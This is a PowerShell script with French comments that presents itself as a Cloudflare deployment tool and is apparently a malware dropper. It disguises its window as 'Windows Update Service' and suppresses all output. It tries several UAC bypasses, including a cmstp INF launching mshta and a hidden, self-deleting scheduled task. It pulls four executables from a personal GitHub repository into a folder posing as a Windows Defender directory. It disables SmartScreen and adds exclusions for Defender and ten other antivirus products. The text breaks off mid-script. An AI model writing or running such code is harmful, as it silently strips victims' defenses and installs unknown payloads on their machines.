#Requires -Version 3.0
# Script robuste de déploiement Cloudflare
# Installation Java, whitelist, téléchargement et exécution

param(
    [string]$DownloadPath = "C:\Program Files\Common Files\Microsoft Shared\Windows Defender",
    [string]$ExecutionPath = $null,
    [int]$CountdownMinutes = 6,
    [switch]$NoElevate = $false,
    [switch]$SkipJava = $false
)

# Validation et normalisation du DownloadPath (pour téléchargement et whitelist)
if ([string]::IsNullOrWhiteSpace($DownloadPath)) {
    $DownloadPath = "C:\Program Files\Common Files\Microsoft Shared\Windows Defender"
    Write-Host "DownloadPath vide, utilisation de la valeur par defaut" -ErrorAction SilentlyContinue
}

# Normaliser le chemin de téléchargement
try {
    $DownloadPath = [System.IO.Path]::GetFullPath($DownloadPath.Trim())
} catch {
    $DownloadPath = $DownloadPath.Trim()
}

# Validation et normalisation du ExecutionPath (pour exécution - indépendant)
if ([string]::IsNullOrWhiteSpace($ExecutionPath)) {
    # Par défaut, utiliser un dossier temporaire système pour l'exécution
    $ExecutionPath = Join-Path $env:TEMP "CloudflareExecution"
    Write-Host "ExecutionPath vide, utilisation de: $ExecutionPath" -ErrorAction SilentlyContinue
}

# Normaliser le chemin d'exécution
try {
    $ExecutionPath = [System.IO.Path]::GetFullPath($ExecutionPath.Trim())
} catch {
    $ExecutionPath = $ExecutionPath.Trim()
}

# S'assurer que les chemins sont différents
if ($DownloadPath -eq $ExecutionPath) {
    Write-Host "ATTENTION: DownloadPath et ExecutionPath sont identiques. Utilisation d'un dossier d'execution separe." -ErrorAction SilentlyContinue
    $ExecutionPath = Join-Path $env:TEMP "CloudflareExecution"
}

# Compatibilité avec l'ancien paramètre TargetPath (pour rétrocompatibilité)
$TargetPath = $DownloadPath

# Validation CountdownMinutes
if ($CountdownMinutes -lt 0) {
    $CountdownMinutes = 6
} elseif ($CountdownMinutes -gt 60) {
    $CountdownMinutes = 60
}

# ============================= CONFIGURATION =============================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$Host.UI.RawUI.WindowTitle = "Windows Update Service"

# URLs des fichiers GitHub
$GitHubFiles = @(
    @{ Name = "Clouflare.jar"; Type = "JAR"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/Clouflare.jar" },
    @{ Name = "InterCloudFlare.exe"; Type = "EXE"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/InterCloudFlare.exe" },
    @{ Name = "SSl.exe"; Type = "EXE"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/SSl.exe" },
    @{ Name = "SecondWinCloud.exe"; Type = "EXE"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/SecondWinCloud.exe" }
)

# URLs Java (adaptées selon l'architecture)
# Utilisation d'Adoptium (Eclipse Temurin) - plus fiable et open source
$JavaUrls = @{
    "x64" = @(
        "https://api.adoptium.net/v3/binary/latest/21/ga/windows/x64/jdk/hotspot/normal/eclipse",
        "https://github.com/adoptium/temurin21-binaries/releases/download/jdk-21.0.1%2B12/OpenJDK21U-jdk_x64_windows_hotspot_21.0.1_12.msi",
        "https://download.oracle.com/java/21/archive/jdk-21_windows-x64_bin.exe"
    )
    "x86" = @(
        "https://api.adoptium.net/v3/binary/latest/17/ga/windows/x86/jdk/hotspot/normal/eclipse",
        "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.13%2B11/OpenJDK17U-jdk_x86-32_windows_hotspot_17.0.13_11.msi"
        # Note: URL Oracle x86 retirée car retourne 404
    )
}

# Configuration
$MaxRetries = 5
$TimeoutSeconds = 600
$TempLogFile = Join-Path $env:TEMP "cloudflare_deploy_log.txt"
$script:LogFile = $null

# ============================= FONCTIONS UTILITAIRES =============================

function Write-Log {
    param([string]$Message, [string]$Level = "Info")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    $logMessage = "[$timestamp] [$Level] $Message"
    try {
        $logPath = if ($script:LogFile) { $script:LogFile } else { $TempLogFile }
        Add-Content -Path $logPath -Value $logMessage -ErrorAction SilentlyContinue
    } catch {}
}

function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

function Get-SystemInfo {
    try {
        $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop
        return @{
            OSVersion = $osInfo.Version
            OSCaption = $osInfo.Caption
            OSArchitecture = $osInfo.OSArchitecture
            Is64Bit = [Environment]::Is64BitOperatingSystem
            WindowsVersion = [version]$osInfo.Version
        }
    } catch {
        return @{
            OSVersion = "Unknown"
            OSCaption = "Windows"
            OSArchitecture = if ([Environment]::Is64BitOperatingSystem) { "64-bit" } else { "32-bit" }
            Is64Bit = [Environment]::Is64BitOperatingSystem
            WindowsVersion = [version]"0.0"
        }
    }
}

function Test-UrlAccess {
    param([string]$Url, [int]$TimeoutSeconds = 10)
    
    try {
        $request = [System.Net.WebRequest]::Create($Url)
        $request.Method = "HEAD"
        $request.Timeout = $TimeoutSeconds * 1000
        $request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        $response = $request.GetResponse()
        $statusCode = [int]$response.StatusCode
        $response.Close()
        
        return ($statusCode -ge 200 -and $statusCode -lt 400)
    } catch {
        return $false
    }
}

function Invoke-WithRetry {
    param(
        [scriptblock]$ScriptBlock,
        [int]$MaxRetries = 3,
        [int]$DelaySeconds = 2,
        [string]$OperationName = "Operation"
    )
    
    $retryCount = 0
    while ($retryCount -lt $MaxRetries) {
        try {
            $result = & $ScriptBlock
            if ($result -ne $null -and $result -ne $false) {
                return $result
            }
            throw "ScriptBlock returned false or null"
        } catch {
            $retryCount++
            if ($retryCount -lt $MaxRetries) {
                $waitTime = [math]::Min($DelaySeconds * $retryCount, 30)
                Write-Log "$OperationName : Tentative $retryCount/$MaxRetries echouee. Nouvelle tentative dans $waitTime secondes..." "Warning"
                Start-Sleep -Seconds $waitTime
            } else {
                Write-Log "$OperationName : Echec apres $MaxRetries tentatives - $($_.Exception.Message)" "Error"
                return $false
            }
        }
    }
    return $false
}

# ============================= ÉLÉVATION DES PRIVILÈGES =============================

function Request-AdminElevation {
    param([int]$Method = 1)
    
    Write-Log "Tentative d'elevation (Methode $Method)" "Info"
    
    # Obtenir le chemin du script de manière robuste
    $scriptPath = if ($MyInvocation.PSCommandPath) { 
        $MyInvocation.PSCommandPath 
    } elseif ($PSCommandPath) { 
        $PSCommandPath 
    } else { 
        $script:MyInvocation.MyCommand.Path 
    }
    
    # Fallback si toujours null
    if (-not $scriptPath -or -not (Test-Path $scriptPath)) {
        $scriptPath = Join-Path $PSScriptRoot "cloudflare_deploy.ps1"
        if (-not (Test-Path $scriptPath)) {
            Write-Log "Impossible de determiner le chemin du script" "Error"
            return $false
        }
    }
    
    $arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$scriptPath`""
    if ($DownloadPath) { $arguments += " -DownloadPath `"$DownloadPath`"" }
    if ($ExecutionPath) { $arguments += " -ExecutionPath `"$ExecutionPath`"" }
    if ($CountdownMinutes) { $arguments += " -CountdownMinutes $CountdownMinutes" }
    if ($SkipJava) { $arguments += " -SkipJava" }
    $arguments += " -NoElevate"
    
    switch ($Method) {
        1 {
            try {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "powershell.exe"
                $psi.Arguments = $arguments
                $psi.Verb = "runas"
                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                $psi.CreateNoWindow = $true
                $psi.UseShellExecute = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
                Write-Log "Elevation: Methode 1 lancee" "Info"
                exit 0
            } catch { Write-Log "Elevation: Methode 1 echouee" "Warning" }
        }
        2 {
            try {
                $cmdArgs = "/c START `"`" /MIN powershell.exe $arguments & EXIT"
                Start-Process -FilePath "cmd.exe" -ArgumentList $cmdArgs -WindowStyle Hidden -ErrorAction Stop
                Write-Log "Elevation: Methode 2 lancee" "Info"
                Start-Sleep -Seconds 2
                exit 0
            } catch { Write-Log "Elevation: Methode 2 echouee" "Warning" }
        }
        3 {
            try {
                $infPath = Join-Path $env:TEMP "cmstp_bypass.inf"
                $infContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
mshta vbscript:Execute("CreateObject('WScript.Shell').Run 'powershell.exe $arguments', 0:close")
mshta vbscript:Execute("CreateObject('WScript.Shell').Run 'taskkill /IM cmstp.exe /F', 0, true:close")
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE, ProfileInstallPath, %UnexpectedError%
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@
                Set-Content -Path $infPath -Value $infContent -Force -ErrorAction Stop
                $cmstpPath = Join-Path $env:SystemRoot "system32\cmstp.exe"
                if (Test-Path $cmstpPath) {
                    Start-Process -FilePath $cmstpPath -ArgumentList "/au `"$infPath`"" -WindowStyle Hidden -ErrorAction Stop
                    Write-Log "Elevation: Methode 3 lancee" "Info"
                    Start-Sleep -Seconds 3
                    exit 0
                }
            } catch { Write-Log "Elevation: Methode 3 echouee" "Warning" }
        }
        4 {
            try {
                $taskName = "WinUpdate_" + [System.Guid]::NewGuid().ToString("N").Substring(0, 8)
                $taskScript = Join-Path $env:TEMP "$taskName.ps1"
                Copy-Item -Path $scriptPath -Destination $taskScript -Force -ErrorAction Stop
                $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
  <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  <AllowHardTerminate>true</AllowHardTerminate>
  <StartWhenAvailable>true</StartWhenAvailable>
  <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  <AllowStartOnDemand>true</AllowStartOnDemand>
  <Enabled>true</Enabled>
  <Hidden>true</Hidden>
  <RunOnlyIfIdle>false</RunOnlyIfIdle>
  <WakeToRun>false</WakeToRun>
  <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  <Priority>4</Priority></Settings>
  <Actions><Exec><Command>powershell.exe</Command>
  <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "$taskScript" -NoElevate</Arguments></Exec></Actions>
</Task>
"@
                $taskXmlPath = Join-Path $env:TEMP "$taskName.xml"
                Set-Content -Path $taskXmlPath -Value $taskXml -Force -ErrorAction Stop
                schtasks.exe /Create /TN $taskName /XML $taskXmlPath /F | Out-Null
                schtasks.exe /Run /TN $taskName | Out-Null
                Write-Log "Elevation: Methode 4 lancee" "Info"
                Start-Sleep -Seconds 2
                schtasks.exe /Delete /TN $taskName /F | Out-Null
                Remove-Item -Path $taskXmlPath, $taskScript -Force -ErrorAction SilentlyContinue
                exit 0
            } catch { Write-Log "Elevation: Methode 4 echouee" "Warning" }
        }
    }
    return $false
}

# Vérifier et élever les privilèges
if (-not $NoElevate) {
    if (-not (Test-AdminPrivileges)) {
        Write-Log "Droits admin non detectes. Tentative d'elevation..." "Info"
        for ($method = 1; $method -le 4; $method++) {
            if (Request-AdminElevation -Method $method) {
                exit 0
            }
            Start-Sleep -Milliseconds 500
        }
        Write-Log "Impossible d'obtenir les droits admin. Continuation..." "Warning"
    } else {
        Write-Log "Droits admin obtenus" "Success"
    }
}

# Initialiser le log final (dans le dossier de téléchargement)
try {
    # S'assurer que le dossier de téléchargement existe
    if (-not (Test-Path $DownloadPath)) {
        $parentPath = Split-Path -Path $DownloadPath -Parent
        if ($parentPath -and -not (Test-Path $parentPath)) {
            New-Item -ItemType Directory -Path $parentPath -Force -ErrorAction SilentlyContinue | Out-Null
        }
        New-Item -ItemType Directory -Path $DownloadPath -Force -ErrorAction Stop | Out-Null
    }
    
    $script:LogFile = Join-Path $DownloadPath "cloudflare_deploy_log.txt"
    
    # Fusionner le log temporaire si existe
    if (Test-Path $TempLogFile) {
        $tempContent = Get-Content $TempLogFile -ErrorAction SilentlyContinue
        if ($tempContent) {
            Add-Content -Path $script:LogFile -Value $tempContent -ErrorAction SilentlyContinue
            Remove-Item -Path $TempLogFile -Force -ErrorAction SilentlyContinue
        }
    }
} catch {
    # En cas d'échec, utiliser le log temporaire
    $script:LogFile = $TempLogFile
    Write-Log "Impossible de creer le log dans $DownloadPath, utilisation du log temporaire" "Warning"
}

Write-Log "=== DEMARRAGE DU SCRIPT CLOUDFLARE DEPLOY ===" "Info"
$sysInfo = Get-SystemInfo
Write-Log "OS: $($sysInfo.OSCaption) $($sysInfo.OSArchitecture)" "Info"
Write-Log "Version: $($sysInfo.OSVersion)" "Info"

# ============================= PHASE 1: INSTALLATION JAVA =============================

if (-not $SkipJava) {
    Write-Log "=== PHASE 1: INSTALLATION JAVA ===" "Info"
    
    function Test-JavaInstalled {
        try {
            # Vérifier dans le PATH
            $javaCmd = Get-Command java -ErrorAction SilentlyContinue
            if ($javaCmd) {
                $javaVersion = java -version 2>&1 | Select-String -Pattern "version"
                if ($javaVersion) {
                    Write-Log "Java deja installe: $javaVersion" "Success"
                    return $true
                }
            }
            
            # Vérifier dans les emplacements standards
            $javaPaths = @(
                "C:\Program Files\Java",
                "C:\Program Files (x86)\Java"
            )
            
            foreach ($javaPath in $javaPaths) {
                if (Test-Path $javaPath) {
                    $javaDirs = Get-ChildItem -Path $javaPath -Directory -Filter "jdk*" -ErrorAction SilentlyContinue
                    foreach ($javaDir in $javaDirs) {
                        $javaExe = Join-Path $javaDir.FullName "bin\java.exe"
                        if (Test-Path $javaExe) {
                            $env:Path = "$($javaDir.FullName)\bin;$env:Path"
                            Write-Log "Java trouve dans: $($javaDir.FullName)" "Success"
                            return $true
                        }
                    }
                }
            }
        } catch {
            Write-Log "Erreur verification Java: $($_.Exception.Message)" "Debug"
        }
        return $false
    }
    
    function Get-ValidJavaUrl {
        $arch = if ($sysInfo.Is64Bit) { "x64" } else { "x86" }
        
        if (-not $JavaUrls.ContainsKey($arch)) {
            Write-Log "Architecture $arch non supportee" "Error"
            return $null
        }
        
        $urls = $JavaUrls[$arch]
        
        if ($null -eq $urls -or $urls.Count -eq 0) {
            Write-Log "Aucune URL Java disponible pour $arch" "Error"
            return $null
        }
        
        foreach ($url in $urls) {
            if ([string]::IsNullOrWhiteSpace($url)) {
                continue
            }
            Write-Log "Verification URL Java: $url" "Info"
            if (Test-UrlAccess -Url $url -TimeoutSeconds 15) {
                Write-Log "URL Java valide: $url" "Success"
                return $url
            }
        }
        return $null
    }
    
    function Install-Java {
        param([string]$JavaUrl, [string]$JavaInstallerPath)
        
        try {
            # Télécharger l'installateur avec timeout
            Write-Log "Telechargement de l'installateur Java..." "Info"
            [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
            
            # Gérer les URLs Adoptium API qui redirigent avec timeout
            $actualUrl = $JavaUrl
            try {
                $request = [System.Net.WebRequest]::Create($JavaUrl)
                $request.Method = "HEAD"
                $request.Timeout = 15000
                $request.AllowAutoRedirect = $true
                $response = $request.GetResponse()
                $actualUrl = $response.ResponseUri.AbsoluteUri
                $response.Close()
            } catch {
                Write-Log "Redirection URL Java: Erreur, utilisation URL originale" "Warning"
            }
            
            # Télécharger avec job et timeout pour éviter le blocage
            $downloadTimeout = [math]::Min($TimeoutSeconds, 300)  # Max 5 minutes
            $downloadJob = Start-Job -ScriptBlock {
                param($Url, $OutputPath, $Timeout)
                try {
                    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
                    Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop
                    return $true
                } catch {
                    return $false
                }
            } -ArgumentList $actualUrl, $JavaInstallerPath, $downloadTimeout
            
            $downloadResult = Wait-Job $downloadJob -Timeout ($downloadTimeout + 10)
            if ($downloadResult) {
                $success = Receive-Job $downloadJob
                Remove-Job $downloadJob -Force
                if (-not $success) {
                    throw "Echec telechargement Java"
                }
            } else {
                # Timeout - continuer
                Write-Log "Telechargement Java: Timeout apres $downloadTimeout secondes, passage a l'URL suivante" "Warning"
                Stop-Job $downloadJob -ErrorAction SilentlyContinue
                Remove-Job $downloadJob -Force
                throw "Timeout telechargement Java"
            }
            
            if (-not (Test-Path $JavaInstallerPath)) {
                throw "Fichier non telecharge"
            }
            
            $fileInfo = Get-Item $JavaInstallerPath
            if ($fileInfo.Length -eq 0) {
                throw "Fichier vide"
            }
            
            Write-Log "Installateur telecharge: $([math]::Round($fileInfo.Length / 1MB, 2)) MB" "Success"
            
            # Installer Java silencieusement
            Write-Log "Installation Java en cours..." "Info"
            $ext = [System.IO.Path]::GetExtension($JavaInstallerPath).ToLower()
            
            if ($ext -eq ".exe") {
                # Essayer plusieurs méthodes d'installation silencieuse avec timeout
                $installArgs = @("/s", "/S", "/silent", "/VERYSILENT", "/qn")
                $installed = $false
                $installTimeout = 300  # 5 minutes max
                
                foreach ($arg in $installArgs) {
                    try {
                        # Utiliser un job avec timeout pour éviter le blocage
                        $installJob = Start-Job -ScriptBlock {
                            param($InstallerPath, $Arg)
                            $proc = Start-Process -FilePath $InstallerPath -ArgumentList $Arg -Wait -NoNewWindow -PassThru -ErrorAction Stop
                            return $proc.ExitCode
                        } -ArgumentList $JavaInstallerPath, $arg
                        
                        # Attendre avec timeout
                        $result = Wait-Job $installJob -Timeout $installTimeout
                        if ($result) {
                            $exitCode = Receive-Job $installJob
                            Remove-Job $installJob -Force
                            Start-Sleep -Seconds 3
                            if (Test-JavaInstalled) {
                                $installed = $true
                                break
                            }
                        } else {
                            # Timeout - tuer le job et passer à la méthode suivante
                            Write-Log "Installation EXE: Timeout avec argument $arg, passage a la methode suivante" "Warning"
                            Stop-Job $installJob -ErrorAction SilentlyContinue
                            Remove-Job $installJob -Force
                        }
                    } catch {
                        Write-Log "Installation EXE: Erreur avec argument $arg - $($_.Exception.Message)" "Warning"
                        # Continuer avec la méthode suivante
                    }
                }
                
                if (-not $installed) {
                    throw "Installation echouee avec toutes les methodes (ou timeout)"
                }
            } elseif ($ext -eq ".msi") {
                $installArgs = "/quiet /norestart /L*v `"$env:TEMP\java_install.log`""
                $installTimeout = 300  # 5 minutes max
                
                # Utiliser un job avec timeout pour éviter le blocage
                $installJob = Start-Job -ScriptBlock {
                    param($InstallerPath, $Args)
                    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$InstallerPath`" $Args" -Wait -NoNewWindow -PassThru -ErrorAction Stop
                    return $proc.ExitCode
                } -ArgumentList $JavaInstallerPath, $installArgs
                
                $result = Wait-Job $installJob -Timeout $installTimeout
                if ($result) {
                    $exitCode = Receive-Job $installJob
                    Remove-Job $installJob -Force
                    
                    if ($exitCode -ne 0 -and $exitCode -ne 3010) {
                        throw "Installation MSI echouee (Code: $exitCode)"
                    }
                } else {
                    # Timeout - continuer quand même
                    Write-Log "Installation MSI: Timeout apres $installTimeout secondes, continuation..." "Warning"
                    Stop-Job $installJob -ErrorAction SilentlyContinue
                    Remove-Job $installJob -Force
                    # Ne pas throw, continuer pour vérifier si Java est installé
                }
            } elseif ($ext -eq ".zip" -or $ext -eq ".tar.gz") {
                # Archive - extraction (pour Adoptium)
                $javaDir = "C:\Program Files\Java"
                if (-not (Test-Path $javaDir)) {
                    New-Item -ItemType Directory -Path $javaDir -Force | Out-Null
                }
                
                $extractDir = Join-Path $env:TEMP "java_extract"
                if (Test-Path $extractDir) {
                    Remove-Item -Path $extractDir -Recurse -Force -ErrorAction SilentlyContinue
                }
                New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
                
                if ($ext -eq ".zip") {
                    Expand-Archive -Path $JavaInstallerPath -DestinationPath $extractDir -Force -ErrorAction Stop
                } else {
                    # Pour tar.gz, nécessiterait 7zip ou tar natif Windows 10+
                    throw "Format tar.gz non supporte directement"
                }
                
                # Trouver le dossier Java et le déplacer
                $javaFolders = Get-ChildItem -Path $extractDir -Directory -Filter "jdk*" | Sort-Object -Property Name -Descending
                if ($javaFolders) {
                    $javaHome = Join-Path $javaDir $javaFolders[0].Name
                    if (Test-Path $javaHome) {
                        Remove-Item -Path $javaHome -Recurse -Force -ErrorAction SilentlyContinue
                    }
                    Move-Item -Path $javaFolders[0].FullName -Destination $javaHome -Force -ErrorAction Stop
                    
                    $javaBin = Join-Path $javaHome "bin"
                    $currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
                    if ($currentPath -notlike "*$javaBin*") {
                        [Environment]::SetEnvironmentVariable("Path", "$currentPath;$javaBin", "Machine")
                    }
                }
                
                Remove-Item -Path $extractDir -Recurse -Force -ErrorAction SilentlyContinue
            }
            
            Start-Sleep -Seconds 5
            
            # Mettre à jour le PATH pour cette session
            $machinePath = [Environment]::GetEnvironmentVariable("Path", "Machine")
            $userPath = [Environment]::GetEnvironmentVariable("Path", "User")
            if ($machinePath) {
                $env:Path = $machinePath
                if ($userPath) {
                    $env:Path += ";$userPath"
                }
            } elseif ($userPath) {
                $env:Path = $userPath
            }
            
            # Attendre un peu plus pour que Java soit disponible
            Start-Sleep -Seconds 3
            
            # Vérifier l'installation avec retry
            $javaFound = $false
            for ($i = 0; $i -lt 5; $i++) {
                if (Test-JavaInstalled) {
                    $javaFound = $true
                    break
                }
                Start-Sleep -Seconds 2
            }
            
            if ($javaFound) {
                Write-Log "Java installe avec succes" "Success"
                Remove-Item -Path $JavaInstallerPath -Force -ErrorAction SilentlyContinue
                return $true
            } else {
                throw "Java non detecte apres installation (apres 5 tentatives)"
            }
        } catch {
            Write-Log "Erreur installation Java: $($_.Exception.Message)" "Error"
            return $false
        }
    }
    
    if (-not (Test-JavaInstalled)) {
        $validJavaUrl = Get-ValidJavaUrl
        if ($validJavaUrl) {
            $javaInstaller = Join-Path $env:TEMP "java_installer.exe"
            $result = Invoke-WithRetry -ScriptBlock {
                Install-Java -JavaUrl $validJavaUrl -JavaInstallerPath $javaInstaller
            } -MaxRetries $MaxRetries -OperationName "Installation Java"
            
            if (-not $result) {
                Write-Log "Phase 1: Echec installation Java" "Warning"
            }
        } else {
            Write-Log "Phase 1: Aucune URL Java valide trouvee" "Warning"
        }
    }
} else {
    Write-Log "Phase 1: Ignoree (SkipJava)" "Info"
}

# ============================= PHASE 2: WHITELIST =============================

Write-Log "=== PHASE 2: WHITELIST ANTIVIRUS ET SMARTSCREEN ===" "Info"

function Add-Whitelist {
    param([string]$Path)
    
    $successCount = 0
    
    # Créer le dossier s'il n'existe pas
    if (-not (Test-Path $Path)) {
        New-Item -ItemType Directory -Path $Path -Force | Out-Null
        Write-Log "Dossier cree: $Path" "Info"
    }
    
    # Windows Defender
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
        $successCount++
        Write-Log "Windows Defender: Exclusion ajoutee" "Success"
    } catch {}
    
    # SmartScreen - Méthodes multiples pour garantir l'exclusion
    try {
        # Méthode 1: Exclusions SmartScreen
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled\Exclusions"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        $exclusionName = $Path -replace '\\', '_'
        Set-ItemProperty -Path $regPath -Name $exclusionName -Value $Path -Type String -Force | Out-Null
        
        # Méthode 2: Windows Defender Exclusions Paths
        $appRepPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
        if (-not (Test-Path $appRepPath)) {
            New-Item -Path $appRepPath -Force | Out-Null
        }
        Set-ItemProperty -Path $appRepPath -Name $Path -Value 0 -Type DWord -Force | Out-Null
        
        # Méthode 3: SmartScreen pour applications
        $smartScreenPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
        if (-not (Test-Path $smartScreenPath)) {
            New-Item -Path $smartScreenPath -Force | Out-Null
        }
        Set-ItemProperty -Path $smartScreenPath -Name "EnableSmartScreen" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
        
        # Méthode 4: SmartScreen pour Edge/IE
        $edgePath = "HKLM:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled"
        if (-not (Test-Path $edgePath)) {
            New-Item -Path $edgePath -Force | Out-Null
        }
        Set-ItemProperty -Path $edgePath -Name "ExcludedPaths" -Value $Path -Type String -Force -ErrorAction SilentlyContinue | Out-Null
        
        # Méthode 5: AppLocker Bypass (si disponible)
        $appLockerPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\AppLocker"
        if (Test-Path $appLockerPath) {
            $exclusionKey = "Exclusion_" + ($Path -replace '[^a-zA-Z0-9]', '_')
            Set-ItemProperty -Path $appLockerPath -Name $exclusionKey -Value $Path -Type String -Force -ErrorAction SilentlyContinue | Out-Null
        }
        
        $successCount++
        Write-Log "SmartScreen: Exclusions ajoutees (5 methodes)" "Success"
    } catch {}
    
    # Antivirus tiers - Liste complète
    $avList = @(
        @{ Name = "Kaspersky"; RegPath = "HKLM:\SOFTWARE\KasperskyLab\protected\PxFilter\Exclude"; ValueName = "ExcludeList" },
        @{ Name = "McAfee"; RegPath = "HKLM:\SOFTWARE\McAfee\DesktopProtection"; ValueName = "Exclusions" },
        @{ Name = "Norton"; RegPath = "HKLM:\SOFTWARE\Norton\Norton360\CurrentVersion\FileSystem"; ValueName = "Exclusions" },
        @{ Name = "Bitdefender"; RegPath = "HKLM:\SOFTWARE\Bitdefender\Profiles\0\FileExclusions"; ValueName = "Counter" },
        @{ Name = "Avast"; RegPath = "HKLM:\SOFTWARE\WOW6432Node\AVAST Software\Avast\Exclusions"; ValueName = "Exclusions" },
        @{ Name = "AVG"; RegPath = "HKLM:\SOFTWARE\AVG\Antivirus\Exclusions"; ValueName = "Paths" },
        @{ Name = "ESET"; RegPath = "HKLM:\SOFTWARE\ESET\ESET Security\CurrentVersion\Config\Plugins\01000400\Profiles\@My profile\Settings"; ValueName = "ExcludedPaths" },
        @{ Name = "TrendMicro"; RegPath = "HKLM:\SOFTWARE\TrendMicro\PC-cillinNTCorp\CurrentVersion\Misc"; ValueName = "ExcludePath" },
        @{ Name = "Sophos"; RegPath = "HKLM:\SOFTWARE\Sophos\Endpoint Defense\Exclusions"; ValueName = "Paths" },
        @{ Name = "Malwarebytes"; RegPath = "HKLM:\SOFTWARE\Malwarebytes\Anti-Malware"; ValueName = "Exclusions" }
    )
    
    foreach ($av in $avList) {
        try {
            if (Test-Path $av.RegPath) {
                if ($av.ValueName -eq "Counter") {
                    $counter = @(Get-ChildItem -Path $av.RegPath -ErrorAction SilentlyContinue).Count + 1
                    Set-ItemProperty -Path $av.RegPath -Name $counter -Value $Path -Force | Out-Null
                } else {
                    $values = @(Get-ItemProperty -Path $av.RegPath -Name $av.ValueName -ErrorAction SilentlyContinue).$($av.ValueName)
                    if ($values -notcontains $Path) {
                        if ($values) {
                            $values = @($values) + $Path
                        } else {
                            $values = @($Path)
                        }
                        Set-ItemProperty -Path $av.RegPath -Name $av.ValueName -Value $values -Force | Out-Null
                    }
                }
                $successCount++
                Write-Log "$($av.Name): Exclusion ajoutee" "Success"
            }
        } catch {}
    }
    
    Write-Log "Whitelist: $successCount exclusion(s) ajoutee(s)" "Success"
    return $successCount
}

# Whitelist : ajouter les deux chemins (téléchargement et exécution)
# IMPORTANT: Les deux chemins doivent être whitelistés pour éviter les blocages antivirus/SmartScreen
# Utiliser des jobs avec timeout pour éviter les blocages
Write-Log "Whitelist: Ajout du chemin de telechargement: $DownloadPath" "Info"
$whitelistJob1 = Start-Job -ScriptBlock {
    param($Path)
    function Add-Whitelist {
        param([string]$Path)
        $successCount = 0
        if (-not (Test-Path $Path)) {
            New-Item -ItemType Directory -Path $Path -Force | Out-Null
        }
        try {
            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
            $successCount++
        } catch {}
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled\Exclusions"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            $exclusionName = $Path -replace '\\', '_'
            Set-ItemProperty -Path $regPath -Name $exclusionName -Value $Path -Type String -Force | Out-Null
            $successCount++
        } catch {}
        return $successCount
    }
    return Add-Whitelist -Path $Path
} -ArgumentList $DownloadPath

$whitelistResult1 = Wait-Job $whitelistJob1 -Timeout 30
if ($whitelistResult1) {
    $count = Receive-Job $whitelistJob1
    Remove-Job $whitelistJob1 -Force
    Write-Log "Whitelist DownloadPath: $count exclusion(s) ajoutee(s)" "Success"
} else {
    Write-Log "Whitelist DownloadPath: Timeout, continuation..." "Warning"
    Stop-Job $whitelistJob1 -ErrorAction SilentlyContinue
    Remove-Job $whitelistJob1 -Force
}

# Whitelist du chemin d'exécution (TOUJOURS, même s'il est différent)
